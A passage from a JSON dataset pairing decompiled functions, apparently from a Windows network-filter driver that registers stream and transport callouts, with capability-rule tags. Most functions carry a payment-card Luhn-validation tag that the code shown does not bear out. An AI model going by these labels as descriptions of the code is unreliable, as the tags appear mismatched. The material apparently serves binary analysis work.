        "decompiled_code": "\nuint64_t fcn.0003a4b0(int64_t arg1, int64_t *arg2, int32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    int32_t iVar11;\n    int64_t iStackX8;\n    int64_t *piStackX16;\n    uint32_t *puStackX32;\n    ulong uStack648;\n    ulong uStack640;\n    int64_t *piStack632;\n    ulong uStack624;\n    uchar auStack616 [48];\n    int64_t iStack568;\n    uchar auStack280 [216];\n    \n    uVar8 = 0;\n    iStackX8 = 0;\n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        uVar6 = 0x21590065;\n    }\n    else {\n        *arg3 = 0;\n        *arg2 = 0;\n        *arg4 = 0;\n        piStackX16 = arg2;\n        puStackX32 = arg4;\n        fcn.000619f6(auStack616, arg1, 0x150);\n        uStack624 = *(iStack568 + 0x28);\n        uVar6 = fcn.00039f70();\n        if (uVar6 == 0) {\n            uVar4 = fcn.00039b68();\n            uVar6 = uVar4;\n            if (uVar4 == 0) {\n                uVar4 = fcn.0003a32c(arg1, 0, auStack280, &iStackX8);\n                iVar7 = iStackX8;\n                uVar6 = uVar4;\n                if (uVar4 == 0) {\n                    do {\n                        iVar11 = uVar8;\n                        iVar10 = uVar8 + iVar7;\n                        cVar3 = (**0x11468)(iVar10);\n                        if ((cVar3 == '\\0') || (cVar3 = (**0x11468)(iVar10 + 200),  cVar3 == '\\0')) break;\n                        iVar5 = fcn.00061a80(iVar10, auStack280, 200, 1, 1);\n                        if (iVar5 == 0) goto code_r0x0003a5c2;\n                        uVar8 = iVar11 + 1U;\n                    } while (iVar11 + 1U < 0xc0);\n                    iVar11 = 0;\ncode_r0x0003a5c2:\n                    if (iVar11 != 0) {\n                        *0x7b394 = iVar11 + 4;\n                        *0x7b398 = iVar11 + 5;\n                        *0x7b39c = iVar11 + 8;\n                    }\n                    *0x7b390 = iVar11;\n                    *0x7b3a0 = fcn.00039a88(iStackX8, 0x200, 0x3a180);\n                    *0x7b3a4 = fcn.00039a88(iStackX8, 0x200, 0x3a198);\n                    *0x7b3a8 = fcn.00039a88(iStackX8, 0x200, 0x3a1e4);\n                    *0x7b3ac = fcn.00039a88(iStackX8, 0x200, 0x3a1cc);\n                    *0x7b3b0 = fcn.00039a88(iStackX8, 0x200, 0x3a1b4);\n                    *0x7b3b4 = fcn.00039a88(iStackX8, 0x200, 0x3a318);\n                    *0x7b3b8 = fcn.00039a88(iStackX8, 0x200, 0x3a1f4);\n                    *0x7b3bc = fcn.00039a88(iStackX8, 0x200, 0x3a224);\n                    *0x7b3a0 = fcn.00039a88(iStackX8, 0x200, 0x3a180);\n                    *0x7b3c0 = fcn.00039a88(iStackX8, 0x200, 0x3a20c);\n                    *0x7b3c4 = fcn.00039a88(iStackX8, 0x200, 0x3a2a4);\n                    *0x7b3c8 = fcn.00039a88(iStackX8, 0x200, 0x3a2c4);\n                    *0x7b3cc = fcn.00039a88(iStackX8, 0x200, 0x3a288);\n                    *0x7b3d0 = fcn.00039a88(iStackX8, 0x200, 0x3a2e0);\n                    *0x7b3d4 = fcn.00039a88(iStackX8, 0x200, 0x3a258);\n                    *0x7b3d8 = fcn.00039a88(iStackX8, 0x200, 0x3a270);\n                    *0x7b3dc = fcn.00039a88(iStackX8, 0x200, 0x3a240);\n                    iVar7 = iStackX8;\n                    *0x7b3e0 = fcn.00039a88(iStackX8, 0x200, 0x3a300);\n                    fcn.0001a764(CONCAT71(iVar7 >> 8, 2), &uStack640, &uStack648);\n                    iVar11 = 0;\n                    for (iVar7 = iStackX8; iVar7 != 0; iVar7 = *(iVar7 + 8)) {\n                        if (iVar7 != iStackX8) {\n                            iVar11 = iVar11 + 1;\n                        }\n                    }\n                    fcn.0001a878(uStack640, uStack648);\n                    iVar10 = iVar11 << 3;\n                    iVar7 = fcn.0002fbf0(iVar10);\n                    *arg2 = iVar7;\n                    if (iVar7 == 0) {\n                        uVar6 = 0xc000009a;\n                    }\n                    else {\n                        fcn.0001a764(CONCAT71(iVar10 >> 8, 2), &uStack640, &uStack648);\n                        *arg3 = 0;\n                        iVar7 = iStackX8;\n                        iVar10 = iStackX8;\n                        while ((iVar7 != 0 && (*arg3 < iVar11))) {\n                            if (iVar7 != iVar10) {\n                                *(*arg2 + *arg3 * 8) = iVar7;\n                                *arg3 = *arg3 + 1;\n                                iVar10 = iStackX8;\n                                if (*arg4 == 0) {\n                                    piVar1 = *(iVar7 + 0x18);\n                                    uVar4 = 0;\n                                    if ((piVar1 != NULL) && (piVar9 = piVar1,  uVar2 = 0,  piVar1[2] == iVar7)) {\n                                        do {\n                                            uVar4 = uVar2;\n                                            cVar3 = (**0x11468)(piVar9);\n                                            if ((cVar3 != '\\0') && (cVar3 = (**0x11468)(*piVar9),  cVar3 != '\\0')) {\n                                                piStack632 = *piVar9 + 0x10;\n                                                cVar3 = (**0x11468)(piStack632);\n                                                if ((cVar3 != '\\0') && (*piStack632 == iVar7)) {\n                                                    arg4 = puStackX32;\n                                                    if (uVar4 != 0) goto code_r0x0003a922;\n                                                    break;\n                                                }\n                                            }\n                                            piVar9 = piVar9 + 1;\n                                            uVar2 = uVar4 + 8;\n                                        } while (uVar4 + 8 < 0x300);\n                                        arg4 = puStackX32;\n                                        uVar4 = 8;\n                                        if (piVar1[1] != 0) {\n                                            uVar4 = 0;\n                                        }\n                                    }\ncode_r0x0003a922:\n                                    *arg4 = uVar4;\n                                    iVar10 = iStackX8;\n                                    arg2 = piStackX16;\n                                }\n                            }\n                            iVar7 = *(iVar7 + 8);\n                        }\n                        fcn.0001a878(uStack640, uStack648);\n                    }\n                    (**0x88b00)(iStackX8);\n                }\n            }\n            *(iStack568 + 0x28) = uStack624;\n            fcn.000619f6(arg1, auStack616, 0x150);\n            fcn.00039acc(L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Network\\\\{4d36e974-e325-11ce-bfc1-08002be10318}\"\n                         , L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n            fcn.00039acc(L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\", L\"filter_c06b1a3b\");\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 2160
    },
    "0003ac3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003ac3c(ulong arg1, ulong noname_1, uchar *arg3, ulong arg4)\n\n{\n    uchar auStack40 [16];\n    \n    fcn.000619f0(auStack40, 0x11fb4);\n    fcn.00061b2e(arg3, 0x88);\n    *(arg3 + 0x10) = 0x3aae8;\n    *(arg3 + 0x18) = 0x3ab00;\n    *(arg3 + 0x20) = 0x3aad4;\n    *(arg3 + 0x28) = 0x3ab20;\n    *arg3 = 0x8a;\n    *(arg3 + 0x30) = 0x3ab30;\n    *(arg3 + 2) = 0x88;\n    *(arg3 + 0x38) = 0x3ac24;\n    arg3[1] = 1;\n    *(arg3 + 0x40) = 0x3ab48;\n    arg3[4] = 6;\n    *(arg3 + 0x48) = 0x3ab60;\n    arg3[5] = 0;\n    *(arg3 + 0x50) = 0x3ab80;\n    arg3[6] = 6;\n    *(arg3 + 0x58) = 0x3ab9c;\n    arg3[7] = 0;\n    *(arg3 + 0x70) = 0x3abb4;\n    *(arg3 + 0x78) = 0x3abcc;\n    *(arg3 + 0x60) = 0x3abe0;\n    *(arg3 + 0x68) = 0x3abf4;\n    *(arg3 + 0x80) = 0x3ac0c;\n    (**0x88ae0)(arg1, auStack40, arg4, arg3, 0x7b3f0);\n    return;\n}\n",
        "token_count": 460
    },
    "0003b260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003b260(ulong arg1, ulong noname_1, uchar *arg3, ulong arg4)\n\n{\n    uchar auStack40 [16];\n    \n    fcn.000619f0(auStack40, 0x11fb4);\n    fcn.00061b2e(arg3, 0x98);\n    *(arg3 + 0x10) = 0x3b0dc;\n    *(arg3 + 0x18) = 0x3b0f4;\n    *(arg3 + 0x20) = 0x3b0c8;\n    *(arg3 + 0x28) = 0x3b114;\n    *arg3 = 0x8a;\n    *(arg3 + 0x30) = 0x3b124;\n    *(arg3 + 2) = 0x98;\n    *(arg3 + 0x38) = 0x3b218;\n    arg3[1] = 2;\n    *(arg3 + 0x40) = 0x3b13c;\n    arg3[4] = 6;\n    *(arg3 + 0x48) = 0x3b154;\n    arg3[5] = 0x14;\n    *(arg3 + 0x50) = 0x3b174;\n    arg3[6] = 6;\n    *(arg3 + 0x58) = 0x3b190;\n    arg3[7] = 0x14;\n    *(arg3 + 0x70) = 0x3b1a8;\n    *(arg3 + 0x78) = 0x3b1c0;\n    *(arg3 + 0x60) = 0x3b1d4;\n    *(arg3 + 0x68) = 0x3b1e8;\n    *(arg3 + 0x80) = 0x3b200;\n    *(arg3 + 0x88) = 0x3b230;\n    *(arg3 + 0x90) = 0x3b248;\n    (**0x88ae0)(arg1, auStack40, arg4, arg3, 0x7b400);\n    return;\n}\n",
        "token_count": 507
    },
    "0003bab4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0003bab4(ulong *arg1, uint *arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    ulong in_stack_00000038;\n    int32_t *in_stack_00000048;\n    int64_t *in_stack_00000050;\n    uint uStack456;\n    uint uStack452;\n    int64_t iStack448;\n    int64_t aiStack440 [2];\n    ulong uStack424;\n    ulong uStack416;\n    ulong uStack408;\n    uint uStack400;\n    uint uStack392;\n    uint *puStack384;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    ulong uStack352;\n    ulong uStack312;\n    ulong uStack304;\n    uint uStack280;\n    uchar auStack276 [20];\n    ulong uStack256;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    ulong *puStack176;\n    uint uStack168;\n    ulong *puStack160;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    \n    uStack456 = 0;\n    uStack452 = 0;\n    uStack280 = 0;\n    fcn.00061a56(auStack276, 0, 0xc4);\n    iStack448 = 0;\n    aiStack440[0] = 0;\n    uStack416 = uStack416._4_4_ << 0x20;\n    fcn.00061a56(&uStack416 + 4, 0, 0x24);\n    piVar2 = in_stack_00000050;\n    bVar1 = false;\n    if (((*in_stack_00000050 != 0) && (iVar3 = (**0x7b0d0)(*0x7b430, *in_stack_00000050, &iStack448),  iVar3 == 0)) &&\n       (iStack448 != 0)) {\n        (**0x88aa8)(&iStack448);\n        return 0;\n    }\n    *piVar2 = 0;\n    if (((*in_stack_00000048 == 0) ||\n        (((iVar3 = (**0x7b0e8)(*0x7b430, *in_stack_00000048, aiStack440),  iVar3 != 0 || (aiStack440[0] == 0)) &&\n         (*in_stack_00000048 = 0,  aiStack440[0] == 0)))) || ((**0x88aa8)(aiStack440),  *in_stack_00000048 == 0)) {\n        fcn.00061a56(&uStack372, 0, 0x2c);\n        uStack376 = *arg2;\n        uStack372 = arg2[1];\n        uStack368 = arg2[2];\n        uStack364 = arg2[3];\n        uStack352 = arg4;\n        iVar3 = (**0x7b0d8)(arg3, &uStack376, in_stack_00000048);\n        if (iVar3 != 0) goto code_r0x0003bd91;\n        bVar1 = true;\n        uStack424 = 0;\n        fcn.00061a56(&uStack372, 0, 0x54);\n        uStack376 = *arg2;\n        uStack372 = arg2[1];\n        uStack368 = arg2[2];\n        uStack364 = arg2[3];\n        uStack312 = *arg1;\n        uStack304 = arg1[1];\n        uStack424 = 0x11fb4;\n        uStack352 = 0x11fb4;\n        iVar3 = (**0x7b0e0)(uStack312, in_stack_00000038, *0x7b430, &uStack376, 0, 0);\n        if (iVar3 == 0) goto code_r0x0003bc98;\n    }\n    else {\ncode_r0x0003bc98:\n        uStack216 = *arg1;\n        uStack212 = *(arg1 + 4);\n        uStack208 = *(arg1 + 1);\n        uStack204 = *(arg1 + 0xc);\n        uStack256 = 0x11fb4;\n        puVar4 = fcn.0003b740(*0x7b430, arg1);\n        uStack200 = *puVar4;\n        uStack196 = puVar4[1];\n        uStack192 = puVar4[2];\n        uStack188 = puVar4[3];\n        puStack176 = &stack0x00000050;\n        in_stack_00000050 = 0xffffffffffffffff;\n        uStack184 = 4;\n        uStack148 = *arg2;\n        uStack144 = arg2[1];\n        uStack140 = arg2[2];\n        uStack136 = arg2[3];\n        puStack160 = &uStack416;\n        uStack152 = 0x4005;\n        puStack384 = &uStack456;\n        uStack168 = 1;\n        uStack416 = *0x14fb0;\n        uStack408 = *0x14fb8;\n        uStack400 = 0;\n        uStack456 = 0;\n        uStack452 = 0;\n        uStack392 = 0x100;\n        iVar3 = (**0x7b0c8)(*0x14fb0, *0x7b430, &uStack280, 0, piVar2);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        if (!bVar1) goto code_r0x0003bd91;\n    }\n    (**0x7b0c0)(*in_stack_00000048);\ncode_r0x0003bd91:\n    *in_stack_00000048 = 0;\n    *piVar2 = 0;\n    return iVar3;\n}\n",
        "token_count": 1401
    },
    "0003c4e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0003c4e8(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int16_t *piVar5;\n    int16_t aiStack392 [4];\n    ushort uStack384;\n    ushort uStack382;\n    ushort uStack380;\n    ushort uStack378;\n    ushort uStack376;\n    ushort uStack374;\n    ushort uStack372;\n    ushort uStack370;\n    ushort uStack368;\n    uchar auStack362 [2];\n    int16_t aiStack360 [4];\n    ushort uStack352;\n    ushort uStack350;\n    ushort uStack348;\n    ushort uStack346;\n    ushort uStack344;\n    ushort uStack342;\n    ushort uStack340;\n    ushort uStack338;\n    ushort uStack336;\n    ushort uStack334;\n    uchar auStack330 [2];\n    int16_t aiStack328 [4];\n    ushort uStack320;\n    ushort uStack318;\n    ushort uStack316;\n    ushort uStack314;\n    ushort uStack312;\n    ushort uStack310;\n    ushort uStack308;\n    ushort uStack306;\n    ushort uStack304;\n    ushort uStack302;\n    ushort uStack300;\n    uchar auStack298 [2];\n    int16_t aiStack296 [4];\n    ushort uStack288;\n    ushort uStack286;\n    ushort uStack284;\n    ushort uStack282;\n    ushort uStack280;\n    ushort uStack278;\n    ushort uStack276;\n    ushort uStack274;\n    ushort uStack272;\n    ushort uStack270;\n    ushort uStack268;\n    uchar auStack266 [2];\n    int16_t aiStack264 [4];\n    ushort uStack256;\n    ushort uStack254;\n    ushort uStack252;\n    ushort uStack250;\n    ushort uStack248;\n    ushort uStack246;\n    ushort uStack244;\n    ushort uStack242;\n    ushort uStack240;\n    ushort uStack238;\n    ushort uStack236;\n    int16_t aiStack234 [5];\n    ushort uStack224;\n    ushort uStack222;\n    ushort uStack220;\n    ushort uStack218;\n    ushort uStack216;\n    ushort uStack214;\n    ushort uStack212;\n    ushort uStack210;\n    ushort uStack208;\n    ushort uStack206;\n    uchar auStack202 [2];\n    int16_t aiStack200 [4];\n    ushort uStack192;\n    ushort uStack190;\n    ushort uStack188;\n    ushort uStack186;\n    ushort uStack184;\n    ushort uStack182;\n    ushort uStack180;\n    ushort uStack178;\n    ushort uStack176;\n    ushort uStack174;\n    ushort uStack172;\n    uchar auStack170 [2];\n    int16_t aiStack168 [4];\n    ushort uStack160;\n    ushort uStack158;\n    ushort uStack156;\n    ushort uStack154;\n    ushort uStack152;\n    ushort uStack150;\n    ushort uStack148;\n    ushort uStack146;\n    ushort uStack144;\n    ushort uStack142;\n    ushort uStack140;\n    uchar auStack138 [2];\n    int16_t aiStack136 [4];\n    ushort uStack128;\n    ushort uStack126;\n    ushort uStack124;\n    ushort uStack122;\n    ushort uStack120;\n    ushort uStack118;\n    ushort uStack116;\n    ushort uStack114;\n    ushort uStack112;\n    ushort uStack110;\n    ushort uStack108;\n    ushort uStack106;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    int16_t *piStack88;\n    uint uStack72;\n    \n    aiStack360[2] = 0x72;\n    uStack350 = 0x6d;\n    aiStack360[0] = 0x73;\n    aiStack360[1] = 0x74;\n    uStack348 = 0x5f;\n    aiStack360[3] = 0x65;\n    uStack352 = 0x61;\n    uStack346 = 99;\n    aiStack296[0] = 0x72;\n    uStack344 = 0x61;\n    uStack342 = 0x6f;\n    uStack340 = 0x74;\n    uStack338 = 0;\n    uStack336 = 0;\n    uStack334 = 0;\n    aiStack296[1] = 0x6b;\n    aiStack296[2] = 0x6e;\n    aiStack296[3] = 0x67;\n    uStack288 = 0x5f;\n    uStack286 = 0x73;\n    uStack284 = 0x65;\n    uStack282 = 0x73;\n    uStack280 = 0x73;\n    uStack278 = 0x69;\n    uStack276 = 0x6f;\n    uStack274 = 0x6e;\n    uStack272 = 0;\n    uStack270 = 0;\n    uStack268 = 0;\n    aiStack392[0] = 0x65;\n    aiStack392[1] = 0x73;\n    aiStack392[2] = 0x74;\n    uStack384 = 0x6c;\n    uStack246 = 0x6c;\n    uStack320 = 0x6c;\n    uStack312 = 0x6c;\n    aiStack392[3] = 0x62;\n    uStack382 = 0x5f;\n    uStack380 = 99;\n    uStack378 = 0x61;\n    uStack376 = 0x6f;\n    uStack374 = 0x74;\n    uStack372 = 0;\n    uStack370 = 0;\n    uStack368 = 0;\n    aiStack264[0] = 0x73;\n    aiStack264[1] = 0x74;\n    aiStack264[2] = 0x72;\n    aiStack264[3] = 0x65;\n    uStack256 = 0x61;\n    uStack254 = 0x6d;\n    uStack252 = 0x5f;\n    uStack250 = 0x66;\n    uStack248 = 0x69;\n    uStack244 = 0x74;\n    uStack242 = 0x65;\n    uStack240 = 0x72;\n    uStack238 = 0;\n    uStack236 = 0;\n    aiStack234[0] = 0;\n    aiStack328[0] = 0x65;\n    aiStack328[1] = 0x73;\n    aiStack328[2] = 0x74;\n    aiStack328[3] = 0x62;\n    uStack318 = 0x5f;\n    uStack316 = 0x66;\n    uStack314 = 0x69;\n    uStack310 = 0x74;\n    uStack308 = 0x65;\n    uStack306 = 0x72;\n    uStack304 = 0;\n    aiStack234[1] = 0x61;\n    aiStack234[4] = 0x65;\n    uStack216 = 0x61;\n    uStack160 = 0x65;\n    uStack150 = 0x61;\n    aiStack200[2] = 0x61;\n    uStack182 = 0x61;\n    aiStack136[2] = 0x61;\n    uStack116 = 0x61;\n    uStack190 = 0x69;\n    uStack302 = 0;\n    uStack300 = 0;\n    aiStack234[2] = 99;\n    aiStack234[3] = 99;\n    uStack224 = 0x70;\n    uStack222 = 0x74;\n    uStack220 = 0x5f;\n    uStack218 = 99;\n    uStack214 = 0x6f;\n    uStack212 = 0x74;\n    uStack210 = 0;\n    uStack208 = 0;\n    uStack206 = 0;\n    aiStack168[0] = 99;\n    aiStack168[1] = 0x6f;\n    aiStack168[2] = 0x6e;\n    aiStack168[3] = 0x6e;\n    uStack158 = 99;\n    uStack156 = 0x74;\n    uStack154 = 0x5f;\n    uStack152 = 99;\n    uStack148 = 0x6f;\n    uStack146 = 0x74;\n    uStack144 = 0;\n    uStack142 = 0;\n    uStack140 = 0;\n    aiStack200[0] = 0x74;\n    aiStack200[1] = 0x72;\n    aiStack200[3] = 0x6e;\n    uStack192 = 0x73;\n    uStack188 = 0x6e;\n    uStack186 = 0x5f;\n    uStack184 = 99;\n    uStack180 = 0x6f;\n    uStack178 = 0x74;\n    uStack176 = 0;\n    uStack174 = 0;\n    uStack172 = 0;\n    aiStack136[0] = 0x74;\n    aiStack136[1] = 0x72;\n    aiStack136[3] = 0x6e;\n    uStack128 = 0x73;\n    uStack126 = 0x6f;\n    uStack124 = 0x75;\n    uStack122 = 0x74;\n    uStack120 = 0x5f;\n    uStack118 = 99;\n    uStack114 = 0x6f;\n    uStack112 = 0x74;\n    uStack110 = 0;\n    uStack108 = 0;\n    uStack106 = 0;\n    uStack104 = 0;\n    fcn.00061a56(&uStack100, 0, 0x44);\n    uVar4 = 0xffffffffffffffff;\n    uVar3 = uVar4;\n    piVar5 = aiStack296;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack296, auStack298 + ~uVar3 * 2, aiStack296 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack360;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack360, auStack362 + ~uVar3 * 2, aiStack360 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack392;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack392, aiStack392 + (~uVar3 - 1), aiStack392 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack264;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack264, auStack266 + ~uVar3 * 2, aiStack264 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack328;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack328, auStack330 + ~uVar3 * 2, aiStack328 + ~uVar3);\n    piVar5 = aiStack234;\n    uVar3 = uVar4;\n    do {\n        piVar5 = piVar5 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*piVar5 != 0);\n    fcn.00031df4(aiStack234 + 1, aiStack234 + ~uVar3, aiStack234 + ~uVar3 + 1);\n    uVar3 = uVar4;\n    piVar5 = aiStack168;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack168, auStack170 + ~uVar3 * 2, aiStack168 + ~uVar3);\n    uVar3 = uVar4;\n    piVar5 = aiStack200;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack200, auStack202 + ~uVar3 * 2, aiStack200 + ~uVar3);\n    piVar5 = aiStack136;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    fcn.00031df4(aiStack136, auStack138 + ~uVar4 * 2, aiStack136 + ~uVar4);\n    piStack88 = aiStack296;\n    uStack72 = 1;\n    if (*0x7b430 == 0) {\n        iVar2 = (**0x7b0b8)(0, 10, 0, &uStack104, 0x7b430);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        *0x7b4f0 = uStack104;\n        *0x7b4f4 = uStack100;\n        *0x7b4f8 = uStack96;\n        *0x7b4fc = uStack92;\n    }\n    iVar2 = (**0x7b0a8)(*0x7b430, 0);\n    if (iVar2 == 0) {\n        iVar2 = fcn.0003bab4(0x14c40, 0x155b8, *0x7b428, 0x3be48);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0003bab4(0x14e40, 0x155c8, *0x7b428, 0x3c39c);\n            if ((iVar2 == 0) && (iVar2 = (**0x7b0b0)(*0x7b430),  iVar2 == 0)) {\n                return 0;\n            }\n        }\n        (**0x7b0a0)(*0x7b430);\n    }\n    (**0x7b098)(*0x7b430);\n    *0x7b430 = 0;\n    return iVar2;\n}\n",
        "token_count": 3575
    },
    "0003cee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0003cee4(ulong arg1)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    uchar auStack24 [24];\n    \n    LOCK();\n    bVar2 = *0x7b4e8 == 1;\n    *0x7b4e8 = *0x7b4e8 ^ bVar2 * (*0x7b4e8 ^ 1);\n    uVar1 = !bVar2 * (*0x7b4e8 ^ 1) ^ 1;\n    if (!bVar2) {\n        uVar1 = fcn.0001a650(auStack24, 0x3cce4, arg1);\n        if (uVar1 == 0) {\n            uVar1 = fcn.00031624(auStack24);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 194
    },
    "0003d114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003d114(void)\n\n{\n    fcn.000313e0(0x7b520);\n    *0x7b518 = 1;\n    return;\n}\n",
        "token_count": 42
    },
    "0003d134": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003d134(void)\n\n{\n    ulong *arg1;\n    uchar auStackX8 [32];\n    \n    *0x7b518 = 0;\n    fcn.00031564(0x7b520, auStackX8, 1);\n    while (arg1 = *0x7b538,  *0x7b538 != NULL) {\n        *0x7b538 = **0x7b538;\n        fcn.0002fc50(arg1);\n    }\n    fcn.00031598(0x7b520, auStackX8, 1);\n    return;\n}\n",
        "token_count": 139
    },
    "0003d4b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0003d4b4(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uchar auStackX24 [16];\n    \n    iVar3 = *0x7b560;\n    iVar2 = *0x7b558;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b540, auStackX24, 0);\n        iVar3 = *0x7b560;\n        iVar2 = *0x7b558;\n    }\n    while (iVar2 != 0x7b558) {\n        if (arg1 == iVar3) goto code_r0x0003d504;\n        piVar1 = iVar3 + 8;\n        iVar3 = *piVar1;\n        iVar2 = *piVar1;\n    }\n    iVar3 = 0;\ncode_r0x0003d504:\n    if (arg2 == 0) {\n        fcn.00031598(0x7b540, auStackX24, 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 255
    },
    "0003d690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0003d690(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t arg1;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    int64_t iStack96;\n    ulong uStack88;\n    int64_t iStack80;\n    int64_t iStack72;\n    uint uVar7;\n    \n    iStack96 = 0;\n    bVar1 = false;\n    uVar5 = 0;\n    iVar4 = (**0x11128)(noname_0, arg2, 0, 0, 0);\n    if (iVar4 == 0) {\n        iVar2 = -0x3fffff66;\n    }\n    else {\n        iStack72 = iVar4;\n        arg1 = fcn.0002fbf0(0x18);\n        iStack80 = arg1;\n        if (arg1 == 0) {\n            iVar2 = -0x3fffff66;\n        }\n        else {\n            (**0x11120)(iVar4, 0, 0);\n            bVar1 = true;\n            piVar6 = &iStack96;\n            uVar5 = uVar5 & 0xffffffff00000000;\n            iVar2 = (**0x7b110)(*0x7b4d8, 0, 0, iVar4, uVar5, arg2, piVar6);\n            uVar7 = piVar6 >> 0x20;\n            if (iVar2 == 0) {\n                (*_fcn.00011600)(arg1, 1, 0);\n                iVar2 = (**0x7b100)(*0x7b4d0, 0, 0, arg3, uVar5 & 0xffffffff00000000 | arg4, 0x14, \n                                    CONCAT44(uVar7, 0x50000), iStack96, arg2, 0x3d214, arg1);\n                if (iVar2 == 0) {\n                    uStack88 = 0xffffffff88ca6c00;\n                    iVar3 = (*_fcn.00011628)(arg1, 0, 0, 0, &uStack88);\n                    if (iVar3 == 0x102) {\n                        iVar2 = -0x3fffffff;\n                    }\n                    else {\n                        iVar4 = 0;\n                        iStack96 = 0;\n                    }\n                }\n            }\n        }\n        if (iVar4 != 0) {\n            if (bVar1) {\n                (**0x11118)(iVar4);\n            }\n            (**0x11110)(iVar4);\n        }\n        if (iStack96 != 0) {\n            (**0x7b108)();\n        }\n        if (arg1 != 0) {\n            fcn.0002fc50(arg1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 661
    },
    "0003d854": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.0003d854(ulong param_1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.0003d4b4(param_1, 0);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "0003d870": {
        "rules": [
